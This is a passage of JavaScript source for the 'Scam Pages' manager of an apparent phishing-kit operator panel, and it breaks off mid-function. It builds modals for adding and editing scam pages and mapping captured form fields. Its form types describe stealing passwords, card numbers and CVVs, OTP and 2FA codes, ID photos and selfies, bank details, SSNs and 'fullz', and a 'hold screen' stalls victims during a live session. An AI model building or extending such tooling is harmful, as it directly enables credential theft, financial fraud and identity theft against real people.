/**
 * ALP - Demo Pages Modals
 * All modal helpers for the Scam Pages manager:
 *   buildModalContent, openEditModal, openAddModal, openDeleteModal,
 *   openGuideModal, field validators, scan/mapper, bindFieldPreview,
 *   showAddScamPageModal (add website), loadWebsitesAndSelect.
 *
 * Depends on: DemoPagesPage (shared state via window.DemoPagesState)
 */

// ─── Shared state accessor ────────────────────────────────────────────────────
// DemoPagesPage exposes its shared state via window.DemoPagesState after init.

function _dpState() { return window.DemoPagesState || {}; }
function _setDpState(patch) { Object.assign(window.DemoPagesState || {}, patch); }

function esc(s) {
  if (!s) return '';
  const d = document.createElement('div');
  d.textContent = String(s);
  return d.innerHTML;
}

// ─── Expected fields & canonical aliases ─────────────────────────────────────
const EXPECTED_FIELDS_BY_TYPE = window.DemoPagesFields.EXPECTED_FIELDS_BY_TYPE;
const CANONICAL_FIELDS        = window.DemoPagesFields.CANONICAL_FIELDS;

function guessCanonical(rawName) {
  return window.DemoPagesFields.guessCanonical(rawName);
}

function renderTypeOptionsHtml(selected) {
  return window.DemoPagesFields.FORM_TYPES.map(t =>
    `<option value="${t.value}" ${selected === t.value ? 'selected' : ''}>${t.label}</option>`
  ).join('');
}

// ─── Live Expected Fields Check ───────────────────────────────────────────────
function validateCapturedFields() {
  const hintEl = document.getElementById('dp-expected-fields-hint');
  if (!hintEl) return;
  const selectEl = document.getElementById('dp-m-type');
  const fieldsInp = document.getElementById('dp-m-fields');
  if (!selectEl || !fieldsInp) return;

  const formType = selectEl.value;
  const expected = EXPECTED_FIELDS_BY_TYPE[formType] || [];
  if (expected.length === 0) {
    hintEl.innerHTML = `<span style="color:var(--text-tertiary);font-size:12px;">No specific fields required for <strong>General</strong> form type.</span>`;
    return;
  }

  const currentFields = fieldsInp.value.split(',').map(f => f.trim()).filter(Boolean);
  const pillsHtml = expected.map(f => {
    const canonical = CANONICAL_FIELDS.find(c => c.value === f);
    const label = canonical ? canonical.label : f;
    const isPresent = currentFields.includes(f);
    const badgeStyle = isPresent
      ? 'border-color:rgba(16,185,129,0.3);color:#34d399;background:rgba(16,185,129,0.08);'
      : 'border-color:rgba(239,68,68,0.3);color:#f87171;background:rgba(239,68,68,0.08);';
    const checkIcon = isPresent
      ? `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="margin-right:4px;vertical-align:middle;display:inline-block;"><polyline points="20 6 9 17 4 12"/></svg>`
      : `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="margin-right:4px;vertical-align:middle;display:inline-block;"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>`;
    return `<span class="dp-field-pill" style="${badgeStyle} margin:2px;display:inline-flex;align-items:center;padding:3px 8px;border-radius:12px;font-size:11px;font-family:monospace;">${checkIcon}${label}</span>`;
  }).join(' ');

  const missingFields = expected.filter(f => !currentFields.includes(f));
  const statusText = missingFields.length === 0
    ? `<span style="color:#34d399;font-weight:600;font-size:11px;">✓ All expected fields captured!</span>`
    : `<span style="color:#f87171;font-weight:500;font-size:11px;">⚠️ Missing: ${missingFields.map(f => { const c = CANONICAL_FIELDS.find(cf => cf.value === f); return `<strong>${c ? c.label.split(' ').slice(1).join(' ') : f}</strong>`; }).join(', ')}</span>`;

  hintEl.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;flex-wrap:wrap;gap:4px;">
      <span style="font-weight:600;font-size:11px;text-transform:uppercase;color:var(--text-tertiary);letter-spacing:0.5px;">Expected fields for this type:</span>
      ${statusText}
    </div>
    <div style="display:flex;flex-wrap:wrap;gap:4px;">${pillsHtml}</div>
    <div style="font-size:10px;color:var(--text-tertiary);margin-top:6px;">💡 Your HTML template should capture these fields.</div>
  `;
}

// ─── Field mapper UI ──────────────────────────────────────────────────────────
function updateMapperDuplicates() {
  const selects = document.querySelectorAll('.dp-map-select');
  const counts = {};
  selects.forEach(sel => {
    const val = sel.value;
    if (val && val !== '__skip__' && val !== '__keep__') {
      counts[val] = (counts[val] || 0) + 1;
    }
  });
  selects.forEach(sel => {
    const val = sel.value;
    // Badge is a sibling of the flex container holding the combobox, inside .dp-field-map-row
    const row = sel.closest('.dp-field-map-row');
    const badge = row ? row.querySelector('.dp-map-badge') : null;
    if (!badge) return;
    if (counts[val] > 1) {
      badge.style.display = 'inline-flex';
      badge.style.background = 'rgba(99,102,241,0.15)';
      badge.style.border = '1px solid rgba(99,102,241,0.3)';
      badge.style.color = '#a5b4fc';
      badge.textContent = '🔗 Combined';
      badge.title = 'Multiple inputs combined into one field';
    } else {
      badge.style.display = 'none';
    }
  });
}

// ─── initSearchableSelects ────────────────────────────────────────────────────
// Upgrades all .dp-map-select <select> elements inside `root` into searchable
// comboboxes. The hidden <select> is kept as the data source for existing code.
function initSearchableSelects(root) {
  const DPF = window.DemoPagesFields;

  // Build flat field list for searching: [{value, label, icon, group, color}]
  const allFields = DPF.CANONICAL_FIELDS.map(f => {
    const grp = DPF.FIELD_GROUPS.find(g => g.key === f.group);
    return { value: f.value, label: f.label.replace(/^\S+\s+/, ''), icon: f.icon || '', groupKey: f.group, groupLabel: grp ? grp.label : f.group, groupColor: grp ? grp.color : '#6b7280' };
  });

  function buildPanel(currentValue, onSelect) {
    const panel = document.createElement('div');
    panel.className = 'dp-sbox-panel';
    panel.innerHTML = `
      <div class="dp-sbox-search-wrap">
        <input type="text" class="dp-sbox-search" placeholder="Search fields…" autocomplete="off" spellcheck="false"/>
      </div>
      <div class="dp-sbox-list"></div>`;

    const searchInput = panel.querySelector('.dp-sbox-search');
    const list = panel.querySelector('.dp-sbox-list');

    function renderList(q) {
      const query = q.toLowerCase().trim();
      const filtered = query
        ? allFields.filter(f => f.value.toLowerCase().includes(query) || f.label.toLowerCase().includes(query) || f.groupLabel.toLowerCase().includes(query))
        : allFields;

      if (!filtered.length) {
        list.innerHTML = '<div class="dp-sbox-empty">No fields found</div>';
        return;
      }

      // Group results
      const byGroup = {};
      const groupOrder = ['system', ...DPF.FIELD_GROUPS.filter(g => g.key !== 'system').map(g => g.key)];
      filtered.forEach(f => {
        if (!byGroup[f.groupKey]) byGroup[f.groupKey] = [];
        byGroup[f.groupKey].push(f);
      });

      let html = '';
      groupOrder.forEach(gKey => {
        const items = byGroup[gKey];
        if (!items || !items.length) return;
        const grp = DPF.FIELD_GROUPS.find(g => g.key === gKey);
        if (gKey !== 'system') {
          html += `<div class="dp-sbox-group" style="color:${grp ? grp.color : '#6b7280'}">${grp ? grp.label : gKey}</div>`;
        }
        items.forEach(f => {
          const active = f.value === currentValue ? ' active' : '';
          html += `<div class="dp-sbox-item${active}" data-value="${f.value}">
            <span class="dp-sbox-item-icon">${f.icon}</span>
            <span class="dp-sbox-item-label">${f.label.replace(/^\S+\s+/, '')}</span>
            <span class="dp-sbox-item-val">${f.value}</span>
          </div>`;
        });
      });
      list.innerHTML = html;

      list.querySelectorAll('.dp-sbox-item').forEach(item => {
        item.addEventListener('mousedown', e => {
          e.preventDefault();
          onSelect(item.dataset.value);
        });
      });
    }

    searchInput.addEventListener('input', () => renderList(searchInput.value));
    renderList('');

    // Re-focus search on open
    setTimeout(() => searchInput.focus(), 40);

    return panel;
  }

  root.querySelectorAll('.dp-map-select, .dp-combine-select').forEach(sel => {
    // Skip already upgraded
    if (sel.dataset.sboxDone) return;
    sel.dataset.sboxDone = '1';

    // Hide native select
    sel.style.display = 'none';

    const wrapper = document.createElement('div');
    wrapper.className = 'dp-sbox';
    if (sel.classList.contains('dp-combine-select')) wrapper.classList.add('dp-sbox-combine');

    const labelText = () => {
      const field = DPF.CANONICAL_FIELDS.find(f => f.value === sel.value);
      return field ? `${field.icon} ${field.label.replace(/^\S+\s+/, '')}` : sel.value;
    };

    const trigger = document.createElement('div');
    trigger.className = 'dp-sbox-trigger';
    trigger.innerHTML = `<span class="dp-sbox-label">${labelText()}</span><svg class="dp-sbox-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>`;

    let panel = null;
    let isOpen = false;

    function openPanel() {
      if (isOpen) return;
      isOpen = true;
      trigger.classList.add('open');
      panel = buildPanel(sel.value, (val) => {
        sel.value = val;
        sel.dispatchEvent(new Event('change', { bubbles: true }));
        trigger.querySelector('.dp-sbox-label').textContent = labelText();
        closePanel();
      });
      wrapper.appendChild(panel);
      setTimeout(() => panel.classList.add('open'), 10);
    }

    function closePanel() {
      if (!isOpen) return;
      isOpen = false;
      trigger.classList.remove('open');
      if (panel) { panel.classList.remove('open'); panel.remove(); panel = null; }
    }

    trigger.addEventListener('click', (e) => { e.stopPropagation(); isOpen ? closePanel() : openPanel(); });
    document.addEventListener('click', () => closePanel());

    // When the hidden select changes externally (e.g. combine btn), sync label
    sel.addEventListener('change', () => {
      trigger.querySelector('.dp-sbox-label').textContent = labelText();
    });

    sel.parentNode.insertBefore(wrapper, sel);
    wrapper.appendChild(sel);
    wrapper.insertBefore(trigger, sel);
  });
}

function buildFieldMapperHtml(foundFields) {
  const DPF = window.DemoPagesFields;

  // Build grouped optgroup HTML once
  function groupedOptsHtml(selectedValue) {
    return DPF.renderGroupedOptionsHtml(selectedValue);
  }

  // Detect split-digit groups and build a banner
  const digitGroups = DPF.detectDigitGroups(foundFields);
  // Show ALL canonical fields in the combine dropdown so the user can pick any target
  const combineTargetFields = DPF.CANONICAL_FIELDS.filter(c =>
    !['__keep__', '__skip__'].includes(c.value)
  );
  const digitBannerHtml = digitGroups.length > 0 ? digitGroups.map((g, gi) => {
    const stemId = `dp-combine-target-${gi}`;
    const optionsHtml = combineTargetFields.map(c =>
      `<option value="${c.value}" ${c.value === g.canonicalSuggestion ? 'selected' : ''}>${c.label}</option>`
    ).join('');
    return `
      <div class="dp-digit-banner" data-stem="${esc(g.stem)}" data-canonical-select="${stemId}"
        style="display:flex;align-items:flex-start;gap:10px;background:rgba(249,115,22,0.08);border:1px solid rgba(249,115,22,0.25);border-radius:8px;padding:10px 12px;transition:background 0.15s;">
        <span style="font-size:18px;flex-shrink:0;margin-top:2px;">🔢</span>
        <div style="flex:1;min-width:0;">
          <div style="font-size:12px;font-weight:700;color:#fb923c;margin-bottom:6px;">Split inputs detected: <code style="font-size:11px;background:rgba(255,255,255,0.06);padding:1px 5px;border-radius:4px;">${esc(g.stem)}1…${esc(g.stem)}${g.fields.length}</code></div>
          <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            <span style="font-size:11px;color:var(--text-secondary);">These ${g.fields.length} inputs look like a split code — combine all into:</span>
            <select id="${stemId}" class="dp-combine-select" style="display:none;">
              ${optionsHtml}
            </select>
            <button type="button" class="dp-combine-btn" data-banner-idx="${gi}"
              style="padding:5px 12px;font-size:11px;font-weight:700;background:rgba(249,115,22,0.2);border:1px solid rgba(249,115,22,0.4);color:#fb923c;border-radius:6px;cursor:pointer;white-space:nowrap;font-family:'Inter',sans-serif;">Combine All →</button>
          </div>
        </div>
      </div>`;
  }).join('') : '';

  return `
    <div id="dp-field-mapper" style="display:flex;flex-direction:column;gap:6px;margin-top:8px;">
      ${digitBannerHtml}
      ${foundFields.map((f, i) => {
        const guess = (window._currentFieldMappings && window._currentFieldMappings[f]) || (DPF.guessCanonical(f));
        return `
          <div class="dp-field-map-row" data-idx="${i}" data-rawfield="${esc(f)}" style="display:grid;grid-template-columns:1fr 16px 1fr 28px;gap:6px;align-items:center;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:7px 10px;transition:border-color 0.15s;">
            <div style="font-size:12px;color:#e5e7eb;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${esc(f)}">${esc(f)}</div>
            <div style="color:var(--text-tertiary);font-size:13px;text-align:center;">→</div>
            <div style="display:flex;align-items:center;gap:6px;width:100%;">
              <select class="dp-map-select" data-raw="${esc(f)}" style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);color:#e5e7eb;border-radius:6px;padding:5px 8px;font-size:12px;font-family:'Inter',sans-serif;flex:1;">${groupedOptsHtml(guess)}</select>
              <span class="dp-map-badge" style="font-size:10px;padding:2px 6px;border-radius:4px;display:none;white-space:nowrap;font-weight:600;"></span>
            </div>
            <button class="dp-row-remove" data-idx="${i}" title="Remove field" style="background:rgba(239,68,68,0.1);border:none;color:#f87171;border-radius:6px;width:24px;height:24px;cursor:pointer;font-size:15px;line-height:1;display:flex;align-items:center;justify-content:center;flex-shrink:0;">×</button>
          </div>`;
      }).join('')}
      <button id="dp-apply-mapping" style="margin-top:4px;padding:7px 14px;background:rgba(99,102,241,0.15);color:#a5b4fc;border:1px solid rgba(99,102,241,0.25);border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;display:flex;align-items:center;gap:6px;width:100%;justify-content:center;">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
        Apply Mapping to Captured Fields
      </button>
    </div>`;
}

// ─── bindFieldPreview ─────────────────────────────────────────────────────────
function bindFieldPreview() {
  const inp = document.getElementById('dp-m-fields');
  const preview = document.getElementById('dp-tag-preview');
  if (!inp || !preview) return;

  const container = document.getElementById('dp-tag-chip-container');
  const chipInput = document.getElementById('dp-chip-input-el');
  const dropdown = document.getElementById('dp-chip-autocomplete-dropdown');

  function renderChips() {
    if (!container || !chipInput) return;
    container.querySelectorAll('.dp-tag-chip').forEach(c => c.remove());
    const tags = inp.value.split(',').map(f => f.trim()).filter(Boolean);
    tags.forEach(tag => {
      const chip = document.createElement('span');
      chip.className = 'dp-tag-chip';
      chip.innerHTML = `${esc(tag)}<button type="button" class="dp-tag-chip-remove" data-tag="${esc(tag)}">&times;</button>`;
      container.insertBefore(chip, chipInput);
    });
    container.querySelectorAll('.dp-tag-chip-remove').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const toRemove = btn.dataset.tag;
        const current = inp.value.split(',').map(f => f.trim()).filter(Boolean);
        inp.value = current.filter(t => t !== toRemove).join(', ');
        inp.dispatchEvent(new Event('input'));
      });
    });
  }

  inp.addEventListener('input', () => {
    const tags = inp.value.split(',').map(f => f.trim()).filter(Boolean);
    preview.innerHTML = tags.map(f => `<span class="dp-field-pill">${esc(f)}</span>`).join('');
    validateCapturedFields();
    renderChips();
  });

  if (container && chipInput && dropdown) {
    const DPF = window.DemoPagesFields;
    function showDropdown(query) {
      const q = query.toLowerCase();
      const allMatches = DPF.CANONICAL_FIELDS.filter(c =>
        c.value !== '__keep__' &&
        c.value !== '__skip__' &&
        (c.value.toLowerCase().includes(q) || c.label.toLowerCase().includes(q))
      );
      if (!allMatches.length) { closeDropdown(); return; }

      // Group results by their group key
      const byGroup = {};
      allMatches.forEach(c => {
        if (!byGroup[c.group]) byGroup[c.group] = [];
        byGroup[c.group].push(c);
      });

      let html = '';
      DPF.FIELD_GROUPS.forEach(g => {
        const items = byGroup[g.key];
        if (!items || !items.length) return;
        html += `<div class="dp-chip-group-header" style="padding:5px 10px 3px;font-size:10px;font-weight:700;color:${g.color};letter-spacing:0.05em;text-transform:uppercase;pointer-events:none;border-top:1px solid rgba(255,255,255,0.05);margin-top:2px;">${g.label}</div>`;
        html += items.map(c =>
          `<div class="dp-chip-option" data-value="${esc(c.value)}" style="display:flex;align-items:center;gap:8px;padding:6px 10px;">
            <span style="font-size:15px;flex-shrink:0;">${c.icon || ''}</span>
            <span style="flex:1;">${esc(c.label.replace(/^\S+\s+/, ''))}</span>
            <span class="dp-chip-option-val" style="font-size:10px;opacity:0.5;font-family:monospace;">${esc(c.value)}</span>
          </div>`
        ).join('');
      });

      dropdown.innerHTML = html;
      dropdown.classList.add('open');
      dropdown.querySelectorAll('.dp-chip-option').forEach(opt => {
        opt.addEventListener('mousedown', (e) => {
          e.preventDefault();
          const val = opt.dataset.value;
          const current = inp.value.split(',').map(f => f.trim()).filter(Boolean);
          if (!current.includes(val)) {
            current.push(val);
            inp.value = current.join(', ');
            inp.dispatchEvent(new Event('input'));
          }
          chipInput.value = '';
          closeDropdown();
        });
      });
    }

    function closeDropdown() { dropdown.classList.remove('open'); }

    chipInput.addEventListener('input', () => showDropdown(chipInput.value));
    chipInput.addEventListener('focus', () => showDropdown(chipInput.value));
    chipInput.addEventListener('blur', () => setTimeout(closeDropdown, 200));

    chipInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ',') {
        e.preventDefault();
        const newTag = chipInput.value.trim().replace(/,/g, '');
        if (newTag) {
          const current = inp.value.split(',').map(f => f.trim()).filter(Boolean);
          if (!current.includes(newTag)) {
            current.push(newTag);
            inp.value = current.join(', ');
            inp.dispatchEvent(new Event('input'));
          }
        }
        chipInput.value = '';
        closeDropdown();
      } else if (e.key === 'Backspace' && chipInput.value === '') {
        const current = inp.value.split(',').map(f => f.trim()).filter(Boolean);
        if (current.length > 0) {
          current.pop();
          inp.value = current.join(', ');
          inp.dispatchEvent(new Event('input'));
        }
      }
    });

    container.addEventListener('click', () => chipInput.focus());
    renderChips();
  }

  const TYPE_DESCS = {
    general:'Generic page — custom fields.',
    loading:'⏳ Hold screen — session shows as "Holding".',
    login:'Captures email/username + password.',
    credit_card:'Captures card number, holder, expiry, CVV.',
    otp:'Captures OTP / SMS codes.',
    email_verify:'Captures email verification codes.',
    authenticator:'Captures 2FA / authenticator codes.',
    id_upload:'Captures ID photos (front, back) + selfie.',
    banking:'Captures bank name, account #, routing #.',
    personal_info:'Captures personal info / fullz.',
    kyc:'Captures SSN, DOB, mother\'s maiden name.',
  };

  function updateTypeDesc() {
    const descEl = document.getElementById('dp-type-desc');
    const selectEl = document.getElementById('dp-m-type');
    if (!descEl || !selectEl) return;
    descEl.textContent = TYPE_DESCS[selectEl.value] || '';
  }

  const selectEl = document.getElementById('dp-m-type');
  if (selectEl) {
    selectEl.addEventListener('change', () => { updateTypeDesc(); validateCapturedFields(); });
  }
  updateTypeDesc();
  validateCapturedFields();

  // Scan button
  const scanBtn = document.getElementById('dp-scan-btn');
  const fileSelect = document.getElementById('dp-m-html-file');
  const statusEl = document.getElementById('dp-scan-status');
  const urlInp = document.getElementById('dp-m-url');
  const mismatchEl = document.getElementById('dp-file-url-mismatch');

  function checkFileUrlMatch() {
    if (!urlInp || !mismatchEl || !fileSelect) return;
    const fileName = fileSelect.value;
    if (!fileName) { mismatchEl.style.display = 'none'; return; }
    const fileBase = fileName.replace(/\.html$/i, '');
    const urlSegs = urlInp.value.replace(/\/$/, '').split('/');
    const urlBase = urlSegs[urlSegs.length - 1];
    if (urlBase && urlBase !== fileBase) {
      mismatchEl.style.display = 'flex';
      mismatchEl.innerHTML = `<span style="font-size:16px;flex-shrink:0;">⚠️</span><span><strong>Filename mismatch!</strong> File is <code>${esc(fileName)}</code> but URL ends in <code>${esc(urlBase)}</code>. Server will return 404.</span>`;
    } else {
      mismatchEl.style.display = 'none';
    }
  }

  if (urlInp && fileSelect) {
    fileSelect.addEventListener('change', () => {
      const fileName = fileSelect.value;
      if (!fileName) return;
      const baseName = fileName.replace(/\.html$/i, '');
      if (urlInp.value.endsWith('/')) urlInp.value = urlInp.value + baseName;
      checkFileUrlMatch();
    });
    urlInp.addEventListener('input', checkFileUrlMatch);
  }

  if (!scanBtn || !fileSelect) return;

  scanBtn.addEventListener('click', async () => {
    const file = fileSelect.value;
    if (!file) return;
    scanBtn.disabled = true; scanBtn.style.opacity = '0.6';
    if (statusEl) { statusEl.style.color = 'var(--text-tertiary)'; statusEl.textContent = 'Scanning…'; }
    const existingMapper = document.getElementById('dp-field-mapper');
    if (existingMapper) existingMapper.remove();

    try {
      const res = await window.ALPApi.scanFields(_dpState().selectedWebsiteId, file);
      const found = res.fields || [];
      if (found.length === 0) {
        if (statusEl) statusEl.textContent = 'No fields detected in this file.';
      } else {
        if (statusEl) { statusEl.style.color = '#10b981'; statusEl.textContent = `✓ Found ${found.length} field${found.length > 1 ? 's' : ''} — map them below:`; }
        const scanSection = document.getElementById('dp-scan-status')?.closest('.form-group');
        if (scanSection) {
          const mapDiv = document.createElement('div');
          mapDiv.innerHTML = buildFieldMapperHtml(found);
          scanSection.appendChild(mapDiv.firstElementChild);

          // Upgrade all .dp-map-select to searchable comboboxes
          const fieldMapper = scanSection.querySelector('#dp-field-mapper');
          if (fieldMapper) initSearchableSelects(fieldMapper);

          // Wire change events on the (now hidden) native selects
          const selects = scanSection.querySelectorAll('.dp-map-select');
          selects.forEach(sel => {
            sel.addEventListener('change', updateMapperDuplicates);
          });
          updateMapperDuplicates();

          document.querySelectorAll('.dp-row-remove').forEach(btn => {
            btn.addEventListener('click', () => {
              btn.closest('.dp-field-map-row').remove();
              updateMapperDuplicates();
            });
          });

          // Wire up digit-group combine banners
          document.querySelectorAll('.dp-digit-banner').forEach(banner => {
            const combineBtn = banner.querySelector('.dp-combine-btn');
            if (!combineBtn) return;
            combineBtn.addEventListener('click', () => {
              const stem = banner.dataset.stem;
              // Read the currently selected target from the inline dropdown
              const selectId = banner.dataset.canonicalSelect;
              const targetSelect = selectId ? document.getElementById(selectId) : null;
              const canonical = targetSelect ? targetSelect.value : 'auth_code';

              document.querySelectorAll('.dp-field-map-row').forEach(row => {
                const rawField = row.dataset.rawfield || '';
                if (rawField.toLowerCase().match(new RegExp('^' + stem + '[\\-_]?\\d+$', 'i'))) {
                  const sel = row.querySelector('.dp-map-select');
                  if (sel) {
                    sel.value = canonical;
                    sel.dispatchEvent(new Event('change', { bubbles: true }));
                    row.style.borderColor = 'rgba(249,115,22,0.5)';
                    setTimeout(() => { row.style.borderColor = ''; }, 1200);
                  }
                }
              });
              updateMapperDuplicates();
              banner.style.background = 'rgba(16,185,129,0.08)';
              banner.style.borderColor = 'rgba(16,185,129,0.3)';
              const titleEl = banner.querySelector('div > div:first-child');
              if (titleEl) titleEl.style.color = '#34d399';
              combineBtn.textContent = '✓ Combined!';
              combineBtn.style.background = 'rgba(16,185,129,0.2)';
              combineBtn.style.borderColor = 'rgba(16,185,129,0.4)';
              combineBtn.style.color = '#34d399';
            });
          });

          const applyBtn = document.getElementById('dp-apply-mapping');
          if (applyBtn) {
            applyBtn.addEventListener('click', () => {
              const rows = document.querySelectorAll('.dp-field-map-row');
              const mapped = []; const mappings = {};
              rows.forEach(row => {
                const select = row.querySelector('.dp-map-select');
                const raw = select?.dataset.raw || '';
                const canonical = select?.value || '__keep__';
                if (canonical === '__skip__') return;
                mapped.push(canonical === '__keep__' ? raw : canonical);
                if (canonical !== '__keep__') mappings[raw] = canonical;
              });
              // Deduplicate — many inputs can map to one canonical field
              const unique = [...new Set(mapped)];
              inp.value = unique.join(', ');
              window._currentFieldMappings = mappings;
              inp.dispatchEvent(new Event('input'));
              const combinedCount = mapped.length - unique.length;
              const msg = combinedCount > 0
                ? `Applied ${unique.length} field(s) — ${combinedCount} input(s) combined`
                : `Applied ${unique.length} field mapping(s)`;
              window.showToast(msg, 'success');
            });
          }
        }
      }
    } catch (err) {
      if (statusEl) { statusEl.style.color = '#ef4444'; statusEl.textContent = 'Scan failed: ' + err.message; }
    } finally {
      scanBtn.disabled = false; scanBtn.style.opacity = '1';
    }
  });
}


// ─── buildModalContent ────────────────────────────────────────────────────────
function buildModalContent(p = null, slug = '', htmlFiles = [], selectedFile = '') {
  const isEdit = !!p;
  const fields = (isEdit && Array.isArray(p.fields_schema)) ? p.fields_schema.join(', ') : '';
  let urlPlaceholder = '/demo/my-page';
  if (slug) urlPlaceholder = `/demo/${slug}/my-page`;

  const fileOptions = htmlFiles.length
    ? htmlFiles.map(f => `<option value="${esc(f.name)}" ${f.name === selectedFile ? 'selected' : ''}>${esc(f.name)}</option>`).join('')
    : '<option value="">No HTML files found</option>';

  const scanSection = htmlFiles.length ? `
    <div class="form-group" style="margin-bottom:6px;">
      <label style="display:flex;align-items:center;justify-content:space-between;">
        <span>Auto-detect from HTML</span>
        <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">picks fields from trackFormData &amp; &lt;input name&gt;</span>
      </label>
      <div style="display:flex;gap:8px;align-items:center;">
        <select id="dp-m-html-file" style="flex:1;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);color:#e5e7eb;border-radius:8px;padding:9px 12px;font-size:13px;font-family:'Inter',sans-serif;">
          ${fileOptions}
        </select>
        <button type="button" id="dp-scan-btn" style="padding:9px 14px;background:linear-gradient(135deg,#6366f1,#7c3aed);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;white-space:nowrap;display:flex;align-items:center;gap:6px;">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
          Scan
        </button>
      </div>
      <div id="dp-scan-status" style="font-size:11px;color:var(--text-tertiary);margin-top:4px;min-height:16px;"></div>
      <div id="dp-file-url-mismatch" style="display:none;margin-top:6px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);border-radius:8px;padding:9px 12px;font-size:12px;color:#f87171;gap:8px;align-items:flex-start;"></div>
    </div>` : '';

  return `
    <div class="dp-modal-form">
      <div class="form-group">
        <label>Page Name</label>
        <input type="text" id="dp-m-name" placeholder="e.g. Payment Card Info" value="${isEdit ? esc(p.name) : ''}" />
      </div>
      ${!isEdit ? `
      <div class="form-group">
        <label>URL Path</label>
        <input type="text" id="dp-m-url" placeholder="${urlPlaceholder}" value="${slug ? `/demo/${slug}/` : '/demo/'}" />
      </div>` : `<input type="hidden" id="dp-m-url" value="${esc(p.url)}" />`}
      <div class="form-group">
        <label>Form Type</label>
        <select id="dp-m-type">${renderTypeOptionsHtml(isEdit ? p.form_type : 'general')}</select>
        <div id="dp-type-desc" style="font-size:11px;color:var(--text-tertiary);margin-top:4px;min-height:14px;"></div>
      </div>
      <div class="form-group" style="margin-top:-6px;margin-bottom:6px;">
        <div id="dp-expected-fields-hint" style="background:rgba(255,255,255,0.02);border:1px dashed rgba(255,255,255,0.08);border-radius:8px;padding:10px 12px;line-height:1.4;"></div>
      </div>
      ${scanSection}
      <div class="form-group">
        <label>Captured Fields <span class="dp-fields-hint">(comma-separated — or use Scan above)</span></label>
        <input type="text" id="dp-m-fields" placeholder="e.g. card_number, expiry, cvv" value="${esc(fields)}" />
        <div class="dp-tag-preview" id="dp-tag-preview">
          ${fields ? fields.split(',').map(f => f.trim()).filter(Boolean).map(f => `<span class="dp-field-pill">${esc(f)}</span>`).join('') : ''}
        </div>
      </div>
    </div>`;
}

// ─── openEditModal ────────────────────────────────────────────────────────────
async function openEditModal(pageId) {
  const { pages, selectedWebsiteId } = _dpState();
  const p = (pages || []).find(pg => pg.id === pageId);
  if (!p) return;
  window._currentFieldMappings = p.field_mappings || {};

  let htmlFiles = [];
  try { const r = await window.ALPApi.getDemoFiles(selectedWebsiteId); htmlFiles = r.files || []; } catch (_) {}

  window.showModal({
    title: `Edit — ${p.name}`, width: '540px',
    content: buildModalContent(p, '', htmlFiles),
    confirmText: 'Save Changes',
    onConfirm: async () => {
      const name = document.getElementById('dp-m-name')?.value.trim();
      const form_type = document.getElementById('dp-m-type')?.value;
      const rawFields = document.getElementById('dp-m-fields')?.value || '';
      const fields_schema = rawFields.split(',').map(f => f.trim()).filter(Boolean);
      const field_mappings = window._currentFieldMappings || {};
      if (!name) { window.showToast('Page name is required', 'warning'); return; }
      try {
        const res = await window.ALPApi.updateDemoPage(p.id, { name, form_type, fields_schema, field_mappings, website_id: parseInt(selectedWebsiteId, 10) });
        const idx = (pages || []).findIndex(pg => pg.id === p.id);
        if (idx !== -1 && window.DemoPagesState) window.DemoPagesState.pages[idx] = res.page;
        window.DemoPagesPage.repaintGrid();
        window.showToast('Page updated successfully', 'success');
      } catch (err) { window.showToast('Failed to update: ' + err.message, 'error'); throw err; }
    }
  });
  setTimeout(bindFieldPreview, 50);
}

// ─── openAddModal ─────────────────────────────────────────────────────────────
async function openAddModal(preselectedFile) {
  const { selectedWebsiteId, websites } = _dpState();
  if (!selectedWebsiteId) return;
  const activeSite = (websites || []).find(w => String(w.id) === String(selectedWebsiteId));
  const slug = activeSite?.demo_slug || '';
  window._currentFieldMappings = {};

  let htmlFiles = [];
  try { const r = await window.ALPApi.getDemoFiles(selectedWebsiteId); htmlFiles = r.files || []; } catch (_) {}

  // Determine the selected file: use preselectedFile if provided
  const effectiveFile = preselectedFile || '';

  window.showModal({
    title: 'Add Scam Page', width: '540px',
    content: buildModalContent(null, slug, htmlFiles, effectiveFile),
    confirmText: 'Add Page',
    onConfirm: async () => {
      const name = document.getElementById('dp-m-name')?.value.trim();
      const url = document.getElementById('dp-m-url')?.value.trim();
      const form_type = document.getElementById('dp-m-type')?.value;
      const rawFields = document.getElementById('dp-m-fields')?.value || '';
      const fields_schema = rawFields.split(',').map(f => f.trim()).filter(Boolean);
      const field_mappings = window._currentFieldMappings || {};

      if (!name) { window.showToast('Page name is required', 'warning'); return; }
      if (!url) { window.showToast('URL path is required', 'warning'); return; }
      if (!url.startsWith('/')) { window.showToast('URL must start with /', 'warning'); return; }
      if (url.endsWith('/')) { window.showToast('⚠️ URL is incomplete — add a page name after the last /', 'warning'); return; }
      const urlParts = url.replace(/^\//, '').split('/');
      if (urlParts.length < 3) { window.showToast('⚠️ URL must follow /demo/<slug>/<page>', 'warning'); return; }
      const selectedFile = document.getElementById('dp-m-html-file')?.value;
      if (selectedFile) {
        const fileBase = selectedFile.replace(/\.html$/i, '');
        const urlBase = urlParts[urlParts.length - 1];
